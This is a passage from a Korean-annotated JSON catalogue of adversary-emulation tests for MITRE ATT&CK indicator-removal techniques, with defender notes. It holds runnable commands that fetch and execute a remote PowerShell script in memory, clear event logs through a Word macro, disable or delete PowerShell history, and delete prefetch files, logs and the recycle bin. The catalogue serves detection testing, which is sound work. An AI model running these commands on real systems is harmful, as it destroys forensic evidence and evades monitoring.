      "summary": "Word VBA 매크로와 WMI(Win32_NTEventLogFile)를 이용해 Security, Backup 이벤트 로그를 삭제한다. Word 프로세스(WINWORD.EXE) 내에서 이벤트 로그 삭제가 수행되도록 시뮬레이션한다.",

      "prerequisites": [
        "1) Microsoft Word가 시스템에 설치되어 있어야 하며, COM 객체 \"Word.Application\" 생성이 가능해야 한다.",
        "2) 매크로 실행이 허용되어야 하며, 보안 설정이 너무 높으면 차단될 수 있다.",
        "3) 이벤트 로그 삭제는 관리자 권한이 필요하므로, WINWORD를 상승된 권한으로 실행하거나 전체 프로세스가 관리자 권한으로 동작해야 한다. 그렇지 않으면 \"Access Denied\" 오류가 발생한다.",
        "4) 인터넷 연결이 가능해야 Invoke-MalDoc.ps1 스크립트를 GitHub에서 다운로드할 수 있다.",
        "5) 실제 환경에서 이벤트 로그(Security, Backup)를 지우는 것은 심각한 증거 훼손이므로, 반드시 격리된 실험 환경에서만 테스트해야 한다."
      ],

      "procedure": [
        "1) 관리자 권한 PowerShell을 실행한다.",
        "2) 사전 검사(Atomic 테스트에서 자동 수행):",
        "   - New-Object -COMObject \"Word.Application\" 으로 Word COM 객체가 정상 생성되는지 확인하고, winword 프로세스를 종료한다.",
        "3) 공격 시나리오 수행:",
        "   - [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 TLS 설정을 최신 버전으로 맞춘다.",
        "   - IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)",
        "     → 원격에서 Invoke-MalDoc.ps1 PowerShell 스크립트를 내려받아 메모리에서 실행한다.",
        "   - Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"",
        "     → 지정된 매크로 파일(T1070.001-macrocode.txt)을 Word에 로드하고, ClearLogs 서브루틴을 실행한다.",
        "4) 매크로 동작(개념적):",
        "   - VBA 코드에서 WMI 클래스(예: Win32_NTEventLogFile)를 사용해 Security, Backup 이벤트 로그에 접근한다.",
        "   - .ClearEventLog() 와 유사한 메서드를 호출해 해당 로그를 비우는 방식으로 구현되어 있다.",
        "5) 결과:",
        "   - 실행 후 이벤트 뷰어에서 \"Windows 로그 → 보안(Security)\" 및 관련 Backup 로그를 확인하면, 로그가 비워졌거나 거의 없는 상태가 된다.",
        "6) 공격자 관점:",
        "   - 워드 문서(매크로 악성 문서)만 열어도, 사용자가 인지하지 못한 상태에서 이벤트 로그를 삭제할 수 있다.",
        "   - Office 프로세스를 이용한 로깅 우회·오용 사례로, T1204.002(사용자 실행)와도 연계된 공격 패턴이다.",
        "7) 방어/포렌식 관점:",
        "   - Office 프로세스에서 WMI를 통해 이벤트 로그에 접근하는 행위를 EDR에서 의심 행위로 탐지할 수 있다.",
        "   - 매크로 실행 정책을 '기본 차단'으로 두고, 서명된 매크로만 허용하는 등 보안 설정 강화가 필요하다.",
        "   - 중요 서버에서는 로컬 이벤트 로그뿐만 아니라, 중앙 로그 서버/집중형 SIEM으로 실시간 복제하여 로컬 삭제 영향 최소화."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\""
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070.003",
  "technique_name": "Indicator Removal on Host: Clear Command History",
  "tactic": "Defense Evasion",
  "description": "공격자는 PowerShell 및 명령 히스토리를 지워서 자신이 입력했던 명령 흔적을 남기지 않거나, 아예 앞으로의 명령이 기록되지 않도록 설정함으로써, 이후 포렌식/모니터링에서 명령 기반 행위(다운로드, 계정 조작, 권한 상승, 백도어 설치 등)를 재구성하기 어렵게 만든다.",

  "tests": [
    {
      "test_id": "2f898b81-3e97-4abb-bc3f-a95138988370",
      "name": "Prevent PowerShell History Logging (히스토리 저장 중단)",
      "platforms": ["windows"],
      "summary": "PSReadLine 옵션을 변경해 현재/향후 PowerShell 세션에서 명령 히스토리가 파일에 저장되지 않도록 한다. 공격자는 이후 수행할 악성 명령이 히스토리에 기록되지 않게 하기 위해 사용할 수 있다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며 PowerShell이 설치되어 있어야 한다(기본 제공).",
        "2) PSReadLine 모듈이 로드되어 있어야 한다(Windows 10 이후 기본 탑재).",
        "3) PowerShell 프로필/환경 변경이 허용되는 계정으로 실행해야 한다.",
        "4) 운영 환경에서 사용할 경우 정상 분석·감사에 방해가 되므로, 반드시 실험/테스트 환경에서만 사용할 것."
      ],

      "procedure": [
        "1) 일반 사용자 또는 관리자 권한 PowerShell을 실행한다.",
        "2) 아래 명령을 실행해 히스토리 저장 방식을 '아무것도 저장하지 않음(SaveNothing)'으로 변경한다.",
        "   Set-PSReadlineOption -HistorySaveStyle SaveNothing",
        "   - 기존: SaveIncrementally(기본값) 또는 SaveAtExit 등의 방식으로 HistorySavePath에 명령이 순차 저장됨.",
        "   - 변경 후: 명령을 입력해도 PowerShell 히스토리 파일에 기록되지 않는다.",
        "3) 테스트:",
        "   - 여러 명령(예: whoami, ipconfig, netstat 등)을 수행한 뒤 PowerShell을 종료한다.",
        "   - (Get-PSReadlineOption).HistorySavePath 경로의 파일을 확인하면, 새로 실행한 명령들이 저장되지 않은 것을 볼 수 있다.",
        "4) 공격자 관점:",
        "   - 이후 수행할 다운로드, 계정 생성, 권한 상승 등의 명령이 히스토리 파일에 남지 않아, 디스크 기반 포렌식에서 추적이 어려워진다.",
        "5) 방어/포렌식 관점:",
        "   - PSReadLine 옵션 변경(Set-PSReadlineOption -HistorySaveStyle SaveNothing)을 로그/EDR에서 이상 징후로 모니터링한다.",
        "   - 중앙집중형 명령 로깅(콘솔 이벤트 로깅, PowerShell Transcription, Script Block Logging 등)을 함께 활성화해 우회하기 어렵도록 설계한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing",
          "cleanup_command": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally"
        }
      ]
    },

    {
      "test_id": "da75ae8d-26d6-4483-b0fe-700e4df4f037",
      "name": "Clear PowerShell History by Deleting History File (히스토리 파일 직접 삭제)",
      "platforms": ["windows"],
      "summary": "Get-PSReadLineOption으로 현재 PowerShell 히스토리 파일 경로를 확인하고, 해당 파일 자체를 삭제하여 과거 명령 기록을 제거한다.",

      "prerequisites": [
        "1) PowerShell과 PSReadLine 모듈이 사용 가능한 Windows 환경.",
        "2) (Get-PSReadLineOption).HistorySavePath 경로에 접근/삭제 권한이 있어야 한다.",
        "3) 실제 운영 환경에서 실행 시, 분석에 필요한 명령 기록이 영구 삭제되므로 반드시 테스트 환경에서만 사용할 것.",
        "4) 삭제 후에도 이후 세션에서 새 히스토리 파일이 다시 생성될 수 있음을 이해해야 한다."
      ],

      "procedure": [
        "1) PowerShell을 실행한다(일반 사용자 또는 관리자).",
        "2) 현재 히스토리 파일 경로를 확인해본다:",
        "   (Get-PSReadlineOption).HistorySavePath",
        "   - 예: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "3) 다음 명령으로 해당 파일을 삭제한다:",
        "   Remove-Item (Get-PSReadlineOption).HistorySavePath",
        "4) 삭제 후 확인:",
        "   - 위 경로의 파일이 삭제되었는지 확인한다.",
        "   - 새 PowerShell 세션을 열면, 이후 다시 히스토리 파일이 생성될 수 있다(기본 동작).",
        "5) 공격자 관점:",
        "   - 과거에 실행한 공격 관련 명령(예: 다운로드, 계정 조작, 서비스 생성)을 지워 흔적을 최소화한다.",
        "6) 방어/포렌식 관점:",
        "   - 히스토리 파일 삭제(Remove-Item + HistorySavePath)를 EDR/파일 감사 정책으로 탐지할 수 있다.",
        "   - 정기적으로 히스토리 파일을 백업하거나, 중앙 시스템으로 명령 이력을 전송하는 구조를 함께 고려한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath"
        }
      ]
    },

    {
      "test_id": "1d0d9aa6-6111-4f89-927b-53e8afae7f94",
      "name": "Set Custom AddToHistoryHandler to Avoid History File Logging (세션 단위 히스토리 훅 우회)",
      "platforms": ["windows"],
      "summary": "PSReadLine의 AddToHistoryHandler 훅을 이용해, 현재 세션에서 입력되는 모든 명령에 대해 \"히스토리에 추가하지 않는다(return $false)\"로 설정하여 히스토리 파일에 아무 것도 기록되지 않게 한다.",

      "prerequisites": [
        "1) Windows PowerShell 또는 PowerShell 7+ 환경에서 PSReadLine 모듈이 활성화되어 있어야 한다.",
        "2) 커스텀 AddToHistoryHandler를 설정할 수 있는 권한(보통 사용자 권한이면 충분)을 가져야 한다.",
        "3) 이 설정은 **현재 세션 범위**에 적용되며, 새 세션에서는 기본값으로 돌아갈 수 있음을 이해해야 한다.",
        "4) 운영 환경에서 무분별하게 적용하면 정상 감사·분석에 필요한 명령 기록이 빠질 수 있으므로 테스트 환경에서만 적극 사용해야 한다."
      ],

      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) 아래 명령으로 AddToHistoryHandler를 재정의한다:",
        "   Set-PSReadLineOption -AddToHistoryHandler { return $false }",
        "   - AddToHistoryHandler는 매 명령 실행 시 $line(현재 명령 문자열)을 입력으로 받아,",
        "     $true를 반환하면 히스토리에 기록, $false를 반환하면 기록하지 않도록 동작한다.",
        "   - 여기서는 모든 명령에 대해 $false를 반환하여 한 줄도 기록되지 않도록 한다.",
        "3) 이후 여러 명령을 입력한 뒤, PowerShell 히스토리를 조회해본다:",
        "   - Get-History 또는 화살표 키(↑)로 이전 명령을 확인했을 때 아무 것도 나오지 않거나, 이전 세션 명령만 있는 상태를 볼 수 있다.",
        "4) 세션 종료 또는 원복:",
        "   - 아래 명령으로 핸들러를 제거하여 기본 동작으로 돌릴 수 있다:",
        "     Set-PSReadLineOption -AddToHistoryHandler $null",
        "5) 공격자 관점:",
        "   - 현재 세션에서 수행하는 모든 명령이 히스토리에 남지 않으므로, 일시적인 작업(다운로드, 인메모리 실행, 크리덴셜 덤프 등)을 은닉하는 데 유용하다.",
        "6) 방어/포렌식 관점:",
        "   - Set-PSReadLineOption -AddToHistoryHandler 호출을 로그/EDR로 모니터링한다.",
        "   - 이 훅 기반 우회를 고려해 PowerShell Script Block Logging, Transcription, 콘솔 출력 캡처 등 다계층 로깅 전략을 설계해야 한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }",
          "cleanup_command": "Set-PSReadLineOption -AddToHistoryHandler $null"
        }
      ]
    },

    {
      "test_id": "22c779cd-9445-4d3e-a136-f75adbf0315f",
      "name": "Clear PowerShell Session History (현재 세션 히스토리 삭제)",
      "platforms": ["windows"],
      "summary": "Clear-History cmdlet을 사용하여 현재 PowerShell 세션에서 기록된 명령 히스토리를 모두 제거한다. 이는 세션 기반 히스토리(메모리 상)를 지우는 동작이다.",

      "prerequisites": [
        "1) PowerShell이 설치된 Windows 환경.",
        "2) Clear-History cmdlet 사용 권한(일반 사용자 권한으로도 가능).",
        "3) 이 동작은 **현재 세션의 히스토리**를 지우는 것이며, 이미 파일에 저장된 이전 세션 히스토리나 다른 로깅(Transcription, ScriptBlockLogging 등)에는 영향을 주지 않을 수 있음을 이해해야 한다.",
        "4) 운영 환경에서 무분별한 사용은 분석을 방해하므로, 교육/테스트 용도 위주로 사용할 것."
      ],

      "procedure": [
        "1) PowerShell을 실행하고, 몇 가지 명령을 일부러 수행한다:",
        "   예) whoami, ipconfig, Get-Process 등",
        "2) 히스토리를 확인해본다:",
        "   Get-History",
        "   - 지금까지 입력한 명령 목록이 출력되는 것을 확인한다.",
        "3) 아래 명령으로 현재 세션 히스토리를 모두 삭제한다:",
        "   Clear-History",
        "4) 다시 히스토리를 조회한다:",
        "   Get-History",
        "   - 아무 항목도 나오지 않거나, 특정 예외적인 항목만 남아있는 것을 확인할 수 있다.",
        "5) 공격자 관점:",
        "   - 한 세션 안에서 실수로 입력한 명령이나, 눈에 띄는 공격 명령을 지워 포렌식 분석을 어렵게 만든다.",
        "6) 방어/포렌식 관점:",
        "   - Clear-History 명령 실행 자체를 감사/EDR에서 이벤트로 수집하고, 의심스러운 세션으로 분류할 수 있다.",
        "   - PowerShell 콘솔 히스토리 외에도, Script Block Logging·Transcription·EDR Command Line Logging 등 여러 소스를 통합 분석해야 한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Clear-History"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070.004",
  "technique_name": "Indicator Removal on Host: File Deletion",
  "tactic": "Defense Evasion",
  "description": "공격자는 로그, 임시 파일, 실행 흔적, 원격 접속 도구 로그 등 자신이 남긴 아티팩트를 삭제하거나 재활용휴지통까지 비워서, 이후 포렌식에서 타임라인을 구성하거나 활동을 재현하기 어렵게 만든다. 단순 삭제뿐 아니라 프리페치, 특정 제품 로그 삭제 등 선택적인 삭제 패턴도 중요한 탐지 포인트가 된다.",

  "tests": [
    {
      "test_id": "861ea0b4-708a-4d17-848d-186c9c7f17e3",
      "name": "Delete a single file - Windows cmd",
      "platforms": ["windows"],
      "summary": "cmd.exe에서 del 명령을 사용해 %TEMP% 경로의 임의 파일을 강제 삭제한다. 공격자는 실행 후 남는 드롭 파일·배치 파일·툴을 빠르게 지우는 용도로 활용할 수 있다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며 cmd.exe 사용이 허용되어 있어야 한다.",
        "2) #{file_to_delete} 위치에 테스트용 파일이 존재해야 한다(프리리퀴짓 스텝에서 echo 로 생성).",
        "3) 파일 삭제 권한이 있는 사용자 계정으로 실행해야 한다.",
        "4) 실제 환경에서는 중요한 파일 경로로 바꾸지 말 것(테스트 전용 파일 사용)."
      ],

      "procedure": [
        "1) 프리리퀴짓(get_prereq_command)을 실행해 테스트용 파일을 생성한다.",
        "   - echo deleteme_T1551.004 >> #{file_to_delete}",
        "2) 생성 여부를 확인한다.",
        "   - 예: 탐색기 또는 cmd에서 \"dir %temp%\" 등으로 파일 존재 여부 확인.",
        "3) 아래 명령을 통해 파일을 강제로 삭제한다.",
        "   - del /f #{file_to_delete}",
        "4) 삭제 결과 확인:",
        "   - 탐색기 또는 \"dir\"로 해당 파일이 더 이상 존재하지 않는지 확인한다.",
        "5) 공격자 관점:",
        "   - 드롭한 페이로드, 임시 스크립트, 공격 도구 등을 빠르게 지워 디스크 기반 증거를 최소화하는 데 사용될 수 있음.",
        "6) 방어/포렌식 관점:",
        "   - 주요 경로(%TEMP%, 다운로드 폴더, 특정 툴 경로 등)에서의 비정상적인 del /f 활동을 모니터링한다.",
        "   - Sysmon/EDR로 삭제 대상 파일 이름 패턴, 프로세스 트리(cmd의 부모 프로세스) 등을 함께 분석한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "del /f #{file_to_delete}"
        }
      ]
    },

    {
      "test_id": "ded937c4-2add-42f7-9c2c-c742b7a98698",
      "name": "Delete an entire folder - Windows cmd",
      "platforms": ["windows"],
      "summary": "cmd.exe에서 rmdir /s /q를 사용해 %TEMP% 아래 특정 폴더 전체를 조용히(질문 없이) 삭제한다. 공격자는 작업 폴더 통째로 제거해 아티팩트를 한 번에 없애는 용도로 사용 가능하다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며 cmd.exe 사용이 가능해야 한다.",
        "2) #{folder_to_delete} 경로에 대상 폴더가 존재해야 한다(get_prereq_command에서 mkdir로 생성).",
        "3) 해당 폴더에 대해 삭제 권한이 있어야 한다.",
        "4) 실제 환경에서는 중요한 경로를 지정하지 말고 %TEMP% 등 테스트 전용 위치만 사용할 것."
      ],

      "procedure": [
        "1) 프리리퀴짓(get_prereq_command)을 실행해 테스트용 폴더를 생성한다.",
        "   - mkdir #{folder_to_delete}",
        "2) 탐색기나 dir 명령으로 폴더가 생성되었는지 확인한다.",
        "3) 다음 명령으로 폴더 및 하위 파일 전체를 삭제한다.",
        "   - rmdir /s /q #{folder_to_delete}",
        "   - /s : 하위 디렉터리와 파일까지 모두 삭제",
        "   - /q : 사용자 확인 질문 없이 조용히 실행",
        "4) 삭제 결과 확인:",
        "   - 탐색기 또는 dir로 #{folder_to_delete}가 더 이상 존재하지 않는지 확인한다.",
        "5) 공격자 관점:",
        "   - C:\\Users\\<user>\\AppData\\Local\\Temp\\<random> 와 같은 작업 폴더를 한 번에 비워 흔적을 줄이려 할 수 있음.",
        "6) 방어/포렌식 관점:",
        "   - rmdir /s /q 패턴, 특히 임의/random한 폴더명을 가진 디렉터리에 대한 반복적인 삭제 시도를 모니터링한다.",
        "   - 삭제 직전 시점의 프로세스 활동, 네트워크 연결, 새 파일 생성 이벤트와 연계 분석이 필요하다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "rmdir /s /q #{folder_to_delete}"
        }
      ]
    },

    {
      "test_id": "9dee89bd-9a98-4c4f-9e2d-4256690b0e72",
      "name": "Delete a single file - Windows PowerShell",
      "platforms": ["windows"],
      "summary": "PowerShell에서 Remove-Item을 이용해 $env:TEMP 아래 파일을 삭제한다. PowerShell 기반 공격 후 흔적 정리에 자주 쓰이는 패턴이다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이고 PowerShell 사용이 허용되어 있어야 한다.",
        "2) #{file_to_delete} 경로에 대상 파일이 존재해야 하며(get_prereq_command에서 New-Item으로 생성), 삭제 권한이 있어야 한다.",
        "3) 테스트 환경에서만 사용하고, 실제 운영 파일·로그 경로는 지정하지 말 것."
      ],

      "procedure": [
        "1) 프리리퀴짓(get_prereq_command)으로 테스트용 파일을 생성한다.",
        "   - New-Item -Path #{file_to_delete} | Out-Null",
        "2) 파일 존재 여부를 확인한다.",
        "   - Test-Path #{file_to_delete}",
        "3) 다음 명령으로 파일을 삭제한다.",
        "   - Remove-Item -Path #{file_to_delete}",
        "4) 삭제 후 확인:",
        "   - Test-Path #{file_to_delete} 실행 시 False가 반환되는지 확인한다.",
        "5) 공격자 관점:",
        "   - PowerShell 스크립트/모듈이 자신의 로깅 파일, 드롭한 툴, 임시 아티팩트를 삭제하는 데 활용할 수 있음.",
        "6) 방어/포렌식 관점:",
        "   - Remove-Item 호출을 Script Block Logging/Transcription에서 모니터링하고, 의심 경로(Temp, AppData, Downloads 등)에 대한 삭제를 우선 분석한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Remove-Item -Path #{file_to_delete}"
        }
      ]
    },

    {
      "test_id": "edd779e4-a509-4cba-8dfa-a112543dbfb1",
      "name": "Delete an entire folder - Windows PowerShell",
      "platforms": ["windows"],
      "summary": "PowerShell Remove-Item -Recurse 옵션으로 폴더와 그 하위 파일/폴더를 모두 삭제한다. 공격자의 작업 디렉터리 전체를 제거하는 전형적인 패턴이다.",

      "prerequisites": [
        "1) Windows + PowerShell 환경.",
        "2) #{folder_to_delete} 경로에 삭제 대상 폴더가 존재해야 한다(get_prereq_command에서 New-Item -Type Directory로 생성).",
        "3) 해당 폴더 및 하위 파일들에 대한 삭제 권한이 필요하다.",
        "4) 실제 운영 데이터가 아닌 테스트용 폴더에서만 진행할 것."
      ],

      "procedure": [
        "1) 프리리퀴짓에서 테스트용 폴더를 생성한다.",
        "   - New-Item -Path #{folder_to_delete} -Type Directory | Out-Null",
        "2) 폴더 생성 여부를 확인한다.",
        "   - Test-Path #{folder_to_delete}",
        "3) 아래 명령으로 폴더 전체를 재귀적으로 삭제한다.",
        "   - Remove-Item -Path #{folder_to_delete} -Recurse",
        "4) 삭제 확인:",
        "   - Test-Path #{folder_to_delete} 결과가 False인지 확인.",
        "5) 공격자 관점:",
        "   - 모듈, 로그, 임시 캡처 파일, 압축 파일 등을 한 번에 지워 공격 흔적을 줄이기 위해 사용.",
        "6) 방어/포렌식 관점:",
        "   - Remove-Item -Recurse 호출과 함께, 삭제 대상 경로·파일 수·계정 정보 등을 수집해 이상 행위 탐지 룰에 활용한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Remove-Item -Path #{folder_to_delete} -Recurse"
        }
      ]
    },

    {
      "test_id": "36f96049-0ad7-4a5f-8418-460acaeb92fb",
      "name": "Delete Prefetch File",
      "platforms": ["windows"],
      "summary": "C:\\Windows\\Prefetch 디렉터리 내 .pf 프리페치 파일 1개를 삭제한다. 프리페치 삭제는 실행 흔적(어떤 프로세스가 언제 얼마나 자주 실행되었는지)을 지우는 대표적인 안티포렌식 기법이다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며 Prefetch 기능이 활성화되어 있어야 한다(일반 클라이언트 환경 기준).",
        "2) C:\\Windows\\Prefetch 디렉터리에 .pf 파일이 최소 1개 이상 존재해야 한다.",
        "3) 관리자 권한(Prefetch 디렉터리 삭제 권한)이 필요하다.",
        "4) 실제 업무 환경에서는 프리페치 삭제가 포렌식 분석에 큰 영향을 미치므로 반드시 학습/테스트용 환경에서만 수행할 것."
      ],

      "procedure": [
        "1) 삭제 전, 현재 프리페치 파일 개수를 확인한다.",
        "   - (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count",
        "2) 아래 PowerShell 명령을 실행해 임의의 .pf 파일 하나를 삭제한다.",
        "   - Remove-Item -Path (Get-ChildItem -Path (Join-Path $Env:SystemRoot 'prefetch') -Filter '*.pf' | Select-Object -First 1).FullName",
        "3) 다시 프리페치 파일 개수를 확인한다.",
        "   - (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count",
        "   - 이전보다 1개 감소한 것을 확인할 수 있다.",
        "4) 공격자 관점:",
        "   - 특정 악성 실행 파일의 프리페치 기록을 삭제해, 어떤 바이너리가 언제 실행되었는지에 대한 흔적을 숨기려 할 수 있다.",
        "5) 방어/포렌식 관점:",
        "   - Prefetch 디렉터리에 대한 삭제 이벤트를 파일 감사/EDR로 모니터링하고, 특히 공격 시간대 전후로 비정상적인 삭제가 있는지 확인.",
        "   - 프리페치가 비정상적으로 \"없는\" 상황 자체가 IOC가 될 수 있으므로, 다른 아티팩트(MFT, Shimcache, Amcache 등)와 교차 검증해야 한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Remove-Item -Path (Get-ChildItem -Path (Join-Path $Env:SystemRoot 'prefetch') -Filter '*.pf' | Select-Object -First 1).FullName"
        }
      ]
    },

    {
      "test_id": "69f50a5f-967c-4327-a5bb-e1a9a9983785",
      "name": "Delete TeamViewer Log Files",
      "platforms": ["windows"],
      "summary": "TeamViewer_##.log 형식과 동일한 이름의 로그 파일을 생성한 후 즉시 삭제해, 원격 제어 도구 로그 삭제 행위를 모방한다.",

      "prerequisites": [
        "1) Windows 환경에서 PowerShell 실행이 가능해야 한다.",
        "2) #{teamviewer_log_file} 경로에 파일을 생성할 권한이 있어야 한다.",
        "3) 실제 TeamViewer 설치 디렉터리가 아닌, 테스트용 위치($env:TEMP 등)를 사용하는 것이 안전하다.",
        "4) 실제 환경에서 진짜 TeamViewer 로그를 삭제하면 원격 접속 증거가 사라질 수 있으므로, 반드시 실험 환경에서만 수행."
      ],

      "procedure": [
        "1) 아래 명령으로 TeamViewer 로그 형식을 모방한 파일을 생성한다.",
        "   - New-Item -Path #{teamviewer_log_file} -Force | Out-Null",
        "2) 파일이 생성되었는지 확인한다.",
        "   - Test-Path #{teamviewer_log_file}",
        "3) 다음 명령으로 해당 로그 파일을 강제로 삭제한다.",
        "   - Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore",
        "4) 삭제 결과 확인:",
        "   - Test-Path #{teamviewer_log_file} 실행 시 False가 반환되는지 확인.",
        "5) 공격자 관점:",
        "   - 실제 TeamViewer_XX.log 파일을 지움으로써 원격 접속, 파일 전송, 세션 기록 등의 흔적을 숨기려 할 수 있음.",
        "6) 방어/포렌식 관점:",
        "   - TeamViewer_##.log 패턴의 파일에 대한 삭제 이벤트를 우선적으로 모니터링하고, 삭제 직전/이후의 프로세스, 네트워크 로그를 연계 분석한다.",
        "   - 원격 접속 행위를 다른 소스(Windows Event Log, 방화벽 로그, EDR 로그 등)와 함께 상호 검증해야 한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "New-Item -Path #{teamviewer_log_file} -Force | Out-Null; Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "f723d13d-48dc-4317-9990-cf43a9ac0bf2",
      "name": "Clears Recycle bin via rd",
      "platforms": ["windows"],
      "summary": "rd /s /q 명령을 사용해 시스템 드라이브의 $RECYCLE.BIN 폴더(휴지통)를 통째로 삭제함으로써, 휴지통에 남아 있던 삭제 파일 흔적을 제거한다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며, %systemdrive%\\$RECYCLE.BIN 경로에 접근 가능한 관리자 권한이 필요하다.",
        "2) 실제 운영 장비에서 실행 시, 사용자의 삭제 파일 복구 가능성이 크게 떨어지므로 반드시 테스트/연구용 환경에서만 사용할 것.",
        "3) 로컬 디스크에 휴지통이 활성화되어 있어야 하고, 일부 보안 솔루션이 이 명령을 차단할 수 있음을 염두에 두어야 한다."
      ],

      "procedure": [
        "1) 명령 실행 전, 휴지통에 파일을 몇 개 넣어 둔다(테스트용 텍스트 파일 등).",
        "2) 관리 권한으로 cmd.exe를 실행한다(필요 시 '관리자 권한으로 실행').",
        "3) 다음 명령을 실행해 시스템 드라이브의 휴지통 디렉터리를 조용히 삭제한다.",
        "   - rd /s /q %systemdrive%\\$RECYCLE.BIN",
        "   - /s : 하위 디렉터리까지 모두 삭제",
        "   - /q : 확인 질문 없이 실행",
        "4) 실행 후 휴지통을 열어보면 비어 있거나, Windows가 다시 초기화한 상태일 수 있다.",
        "5) 공격자 관점:",
        "   - 중요한 파일을 삭제한 뒤 휴지통까지 비워, 사용자가 간단히 복원하지 못하게 하고 포렌식 복구 난이도를 높인다.",
        "6) 방어/포렌식 관점:",
        "   - %systemdrive%\\$RECYCLE.BIN에 대한 rd /s /q 호출을 고위험 이벤트로 간주하고, 해당 시점의 사용자·프로세스·네트워크 행위를 집중 분석한다.",
        "   - 휴지통 삭제 이후에도 볼륨 섀도우 복사본, MFT, 저수준 복구 도구 등을 활용해 삭제 파일을 최대한 복원해야 한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "rd /s /q %systemdrive%\\$RECYCLE.BIN"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070.005",
  "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
  "tactic": "Defense Evasion",
  "description": "공격자는 자신이 사용하던 네트워크 공유(파일 서버, C2 공유, 임시 드롭 폴더 등)를 사용 후 바로 끊거나, 관리자 공유(C$, ADMIN$, IPC$) 자체를 비활성화하여 흔적을 줄이려 한다. 이 과정에서 공유 접속 기록, 파일 접근 흔적, 원격 관리 흔적을 숨기거나 방해할 수 있어 디지털 포렌식과 모니터링을 어렵게 만든다.",

  "tests": [
    {
      "test_id": "14c38f32-6509-46d8-ab43-d53e32d2b131",
      "name": "Add Network Share (Windows cmd)",
      "platforms": ["windows"],
      "summary": "net use / net share 명령으로 임의 네트워크 공유를 추가한다. 실제 제거 테스트(T1070.005)에서 삭제 대상이 될 공유를 미리 만들어 두는 설정 단계 역할을 한다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows 환경이어야 하며 net.exe 사용이 가능해야 한다.",
        "2) 기본 예시에서 사용하는 UNC 경로(\\\\test\\share)는 실제 존재하지 않을 수 있으므로, 실습 환경에서는 존재하는 테스트 파일 서버 경로나 로컬 테스트 공유로 변경하는 것이 안전하다.",
        "3) 공유를 생성할 권한(일반적으로 로컬 관리자 권한)이 있어야 한다.",
        "4) 실제 운영 환경의 중요 파일 서버·공유 이름 대신, 반드시 테스트 전용 공유 이름을 사용할 것."
      ],

      "procedure": [
        "1) cmd.exe를 실행한다(필요 시 관리자 권한).",
        "2) 네트워크 드라이브로 공유를 매핑한다(예시).",
        "   - net use c: #{share_name}",
        "   - 여기서 #{share_name}은 기본값으로 \\\\test\\share 를 사용하지만, 실제 테스트에서는 접근 가능한 공유 경로로 교체하는 것이 좋다.",
        "3) 로컬에서 새 공유를 만들고 설명/캐시 옵션을 지정한다.",
        "   - net share test=#{share_name} /REMARK:\"test share\" /CACHE:No",
        "4) net share 명령으로 현재 공유 목록을 확인해 'test' 공유가 생성되었는지 확인한다.",
        "5) 공격자 관점:",
        "   - C2 서버나 임시 파일 업로드 경로를 네트워크 공유로 설정해놓고, 작업 후 공유 자체를 삭제해 흔적을 줄이는 시나리오에서 선행 단계가 될 수 있다.",
        "6) 방어/포렌식 관점:",
        "   - net share / net use 를 통해 갑자기 생긴 의심스러운 공유 및 매핑 드라이브를 탐지하고, 해당 공유를 사용한 프로세스·사용자·접속 원격지 등을 함께 분석해야 한다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net use c: #{share_name}\r\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No"
        }
      ]
    },

    {
      "test_id": "09210ad5-1ef2-4077-9ad3-7351e13e9222",
      "name": "Remove Network Share (Windows cmd)",
      "platforms": ["windows"],
